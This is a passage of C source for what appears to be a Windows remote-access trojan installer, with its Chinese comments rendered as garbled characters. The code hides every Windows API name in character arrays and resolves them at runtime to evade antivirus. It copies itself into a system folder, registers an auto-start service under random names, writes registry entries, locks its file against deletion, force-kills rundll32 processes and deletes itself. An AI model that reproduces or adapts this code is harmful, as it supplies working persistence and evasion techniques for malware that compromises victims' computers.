	CopyFileAT pCopyFileA=(CopyFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS07);
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (Gyfunction->my_strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
	{
		MyCreatDirector(SystemPath);   //�����ļ���
		pCopyFileA(FilePath,SystemPath,FALSE);  //�����ļ�
		if(m_ServiceInfo.Dele_zd)  //��װ����
		{
            Wj_OnButtonAdd(SystemPath);  //�ļ�����
		}
		memset(FilePath,0,MAX_PATH);
		strcpy(FilePath,SystemPath);
//		fDelete_Me = TRUE;
	}

	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);
	pSleep(5000);
//	char MyPath[MAX_PATH];

//	char run[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'};
//	WriteRegEx(HKEY_LOCAL_MACHINE,run,ServiceName, REG_SZ,SystemPath,strlen(SystemPath), 0);
	char Desc[MAX_PATH];
	HKEY key=NULL;
	SC_HANDLE newService=NULL, scm=NULL;

	__try
	{
		char HrFvD17[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
		OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD17);

		char JwFNw18[] = {'C','r','e','a','t','e','S','e','r','v','i','c','e','A','\0'};
		CreateServiceAT pCreateServiceA=(CreateServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw18);
		scm = pOpenSCManagerA(0, 0,SC_MANAGER_ALL_ACCESS);
		if (!scm)
			__leave;
		newService = pCreateServiceA(
			scm, m_ServiceName, m_DisplayName,
		SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,
		FilePath,NULL, NULL, NULL, NULL, NULL);
		//����һ�·���...

		char JwFNw13[] = {'L','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
		LockServiceDatabaseT pLockServiceDatabase=(LockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw13);
		SC_LOCK sc_lock=pLockServiceDatabase(scm);
		SERVICE_DESCRIPTION Service_Descrip={&ServicePlay[0]};

		char VnUDS08[] = {'C','h','a','n','g','e','S','e','r','v','i','c','e','C','o','n','f','i','g','2','A','\0'};
		ChangeServiceConfig2AT pChangeServiceConfig2A=(ChangeServiceConfig2AT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS08);
		pChangeServiceConfig2A(newService,SERVICE_CONFIG_DESCRIPTION,&Service_Descrip);

		char VnUDS06[] = {'U','n','l','o','c','k','S','e','r','v','i','c','e','D','a','t','a','b','a','s','e','\0'};
		UnlockServiceDatabaseT pUnlockServiceDatabase=(UnlockServiceDatabaseT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS06);
		pUnlockServiceDatabase(sc_lock);
		char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	    GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);

		char HrFvD09[] = {'S','t','a','r','t','S','e','r','v','i','c','e','A','\0'};
		StartServiceAT pStartServiceA=(StartServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD09);

		char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
		OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
		if (newService == NULL)
		{
			if (pGetLastError() == ERROR_SERVICE_EXISTS)
			{
				newService = pOpenServiceA(scm,m_ServiceName,SERVICE_ALL_ACCESS);
				if (newService==NULL)
					__leave;
				else
					pStartServiceA(newService,0, 0);
			}
		}
		if (!pStartServiceA(newService,0, 0))
			__leave;
		strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");
		strcat(Desc,m_ServiceName);

		char JwFNw16[] = {'R','e','g','O','p','e','n','K','e','y','A','\0'};
		RegOpenKeyAT pRegOpenKeyA=(RegOpenKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),JwFNw16);
		pRegOpenKeyA(HKEY_LOCAL_MACHINE,Desc,&key);
		char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	    lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
		char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
		RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
		pRegSetValueExA(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,plstrlenA(m_Description));
	}

	__finally
	{
		char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	    RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
		
		char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
        CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
		if (newService!=NULL)
			pCloseServiceHandle(newService);
		if (scm!=NULL)
			pCloseServiceHandle(scm);
		if (key!=NULL) 
			pRegCloseKey(key);
	}
}

void ServiceMain_2(void)
{
	if(m_ServiceInfo.Dele_fs)  //��ռģʽ����
	{
		OccupyFile(AZname);     //��ռģʽ����(ռ��ģʽ)  �޷�ɾ��
	}
	my_ServiceMain();
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
	ServiceMain_2();
}



void my_stormRands(CHAR Number,CHAR Data[])  //��ȡ�������
{
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	for (int i=0;i<Number;i++)
	{
	    pSleep(StormRand(20));
		if(i==6||i==15)
		{
			Data[i]=' ';
			i++;
			Data[i]='a'+StormRand(26);
			continue;
		}
		Data[i]='a'+StormRand(26);
	}
	Data[0]=Data[0]-32;
}

void ReleiceName(LPCTSTR lpServiceName, LPCTSTR lpGroupName)  //�޸İ�װ��������
{
	char	strSubKey[1024];
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey,JYvni08,lpServiceName);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ReleiceName", REG_SZ, (char *)lpGroupName, plstrlenA(lpGroupName), 0);
}

void KProcess()   //K�ս��߽���
{
	char CYZuy01[] = {'W','i','n','E','x','e','c','\0'};
	WinExecT pWinExec=(WinExecT)GetProcAddress(LoadLibrary("KERNEL32.dll"),CYZuy01);
	char CYZuy02[] = {'r','u','n','d','l','l','3','2','.','e','x','e','\0'};
	if( GetProcessID(CYZuy02) != NULL)
	{
		pWinExec("taskkill /f /im rundll32.exe",SW_HIDE);  //�رս���
	}
}

//////////////////////////////////////////////////////////////////////////
int APIENTRY WinMain( __in HINSTANCE hInstance, 
					  __in_opt HINSTANCE hPrevInstance, 
					  __in_opt LPSTR lpCmdLine, 
					  __in int nShowCmd )
{

//////////////////////////////////////////////////////////////////////////
	// ����������ʱ��С©��������ʧ

	__asm   //�ӻ�
	{
	  nop
	  nop
	  nop
	  nop
	  nop
	  nop
	}
	char Lfrfz02[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char SSzlC22[] = {'G','e','t','I','n','p','u','t','S','t','a','t','e','\0'};
	GetInputStateT pGetInputState=(GetInputStateT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC22);
	pGetInputState();
	char Lfrfz07[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d','\0'};
	GetCurrentThreadIdT pGetCurrentThreadId=(GetCurrentThreadIdT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz07);

	char SSzlC23[] = {'P','o','s','t','T','h','r','e','a','d','M','e','s','s','a','g','e','A','\0'};
	PostThreadMessageAT pPostThreadMessageA=(PostThreadMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC23);
	pPostThreadMessageA(pGetCurrentThreadId(),NULL,0,0);
	MSG	msg;

	char SSzlC24[] = {'G','e','t','M','e','s','s','a','g','e','A','\0'};
	GetMessageAT pGetMessageA=(GetMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC24);
	pGetMessageA(&msg, NULL, NULL, NULL);

/////////////////////////////////////////////////////////////////////////////////////////////////
	char lpBuffer[1024]={NULL};
    char strSubKey0[1024]={NULL};

	MyEncryptFunction((LPSTR)&m_ServiceInfo,sizeof(SERVERINFO));  //��װ��Ϣ����
	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));   //������Ϣ����

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp01);

	CHAR Path[MAX_PATH]={NULL};
	char CPolQ15[] = {'E','x','p','a','n','d','E','n','v','i','r','o','n','m','e','n','t','S','t','r','i','n','g','s','A','\0'};
	ExpandEnvironmentStringsAT pExpandEnvironmentStringsA=(ExpandEnvironmentStringsAT)GetProcAddress(LoadLibrary(Lfrfz02),CPolQ15);
	pExpandEnvironmentStringsA(m_ServiceInfo.ReleasePath,Path,MAX_PATH);  // %SystemRoot%\���������·�� C:WINDOWS\ 
	__asm nop;
	__asm nop;
	strcpy(m_ServiceInfo.ReleasePath,Path);

	if(m_ServiceInfo.ReleasePath[strlen(m_ServiceInfo.ReleasePath)-1]=='\\') //ȥ������'\\'
        m_ServiceInfo.ReleasePath[strlen(m_ServiceInfo.ReleasePath)-1]=0;

	char DQeBW01[] = {'%','s','\\','%','s','\0'};
	Gyfunction->my_sprintf(AZname,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   //���Ӱ�װĿ¼�ͳ�������
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");
	char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp25);

	if(m_ServiceInfo.Dele_Kzj)  //����Ƿ�K�ս���
	    KProcess(); //K�ս��߽���

	//��ȡ��װ��������
	char Sermess[MAX_PATH]={NULL};  //
	pwsprintfA(Sermess, JYvni08,m_ServiceInfo.ReleacsName);	
	ReadRegEx(HKEY_LOCAL_MACHINE,Sermess,"ReleiceName", REG_SZ, (char *)ServiceName, NULL, sizeof(ServiceName), 0);
	if(m_ServiceInfo.Dele_zc)  //���װ
	{
        char szbuf_b[MAX_PATH]={NULL};  //����·��
		char Lfrfz05[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A','\0'};
	    GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz05);
		pGetModuleFileNameA(NULL,szbuf_b,MAX_PATH);   //���ڻ�ȡ������·�� 

        if (strcmp(szbuf_b,AZname)==0)  //�ж���·�� �ǰ�װ;��
		{	
		    SERVICE_TABLE_ENTRY serviceTable[] = 
			{
				{ServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
				{NULL,NULL}
			};
			char LCoHX01[] = {'S','t','a','r','t','S','e','r','v','i','c','e','C','t','r','l','D','i','s','p','a','t','c','h','e','r','A','\0'};
			StartServiceCtrlDispatcherAT pStartServiceCtrlDispatcherA=(StartServiceCtrlDispatcherAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),LCoHX01);

			Installope=1;  //д�����з�ʽ  ������������
			pSleep(500);
			pStartServiceCtrlDispatcherA(serviceTable);   //���������ļ�
			pSleep(1000);
			pStartServiceCtrlDispatcherA(serviceTable);   //���������ļ�
			Installope=2;  //д�����з�ʽ  �����޷�������Ϊֱ������
			ServiceMain_2();  //ֱ�������ļ�
		}
	    else
		{
			memset(ServiceName, 0, sizeof(ServiceName));
		    my_stormRands(13,ServiceName);  //�����������
		    my_stormRands(15,ServicePlay);  //���������ʾ
		    my_stormRands(27,ServiceDesc);  //�����������
			ReleiceName(m_ServiceInfo.ReleacsName,ServiceName);  //д�밲װ��������

			char DQeBW01[] = {'%','s','\\','%','s','\0'};
		    char AZnamess[MAX_PATH]={NULL};  //��װ;��������
		    Gyfunction->my_sprintf(AZnamess,DQeBW01,m_ServiceInfo.ReleasePath,m_ServiceInfo.ReleaseName);   //���Ӱ�װĿ¼�ͳ�������
			SetGroup(ServiceName, m_ServiceInfo.szGroup);//д�������Ϣ
			MarkTime(ServiceName);  //д�����汾��װʱ����Ϣ

			RunService(AZnamess,ServiceName,ServicePlay,ServiceDesc);  //��װ����

			UINT strmin=0,strmin2=0;
			char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
            ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
			while(1)
			{
			    if(GetProcessID(m_ServiceInfo.ReleaseName))  //������ ���ֳ�������
				{
					if(m_ServiceInfo.Dele_te)    //�������к�ɾ��
					{
						DeleteMe();  //������ɾ��
					}
					break;
				}
				strmin++;
				if(strmin>=3000)   //����û�������� ��Ϊֱ�����г���
				{
					strmin=0;
					pShellExecuteA(NULL,"open",AZnamess,NULL,NULL,SW_SHOW); //����Ŀ���ļ�
					strmin2++;
					if(strmin2>=3)
					{
						break;
					}
				}
			}

			pExitProcess(NULL);  // �˳����г���
		}
	}
	else  //���Ǹ��װ
	{
		Gyfunction->my_sprintf(ServiceName,"%s",m_ServiceInfo.ReleacsName);  //��ֵ��������
	    //����Ƿ��з�����Ϣ����д�������Ϣ
		pwsprintfA(strSubKey0, JYvni08,ServiceName);	
	    ReadRegEx(HKEY_LOCAL_MACHINE,strSubKey0,"ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, sizeof(lpBuffer), 0);

	    if (plstrlenA(lpBuffer) == 0)  //
		{
		    SetGroup(ServiceName, m_ServiceInfo.szGroup);//д�������Ϣ
			MarkTime(ServiceName);  //д�����汾��װʱ����Ϣ	
		}
		Installope=0;  //д�����з�ʽ  ��ɫ����
		my_ServiceMain();  //�����ļ� 
	}
	

    return 0;
  }

////////////////////////////////////////////////////////////////////////////////////////////////
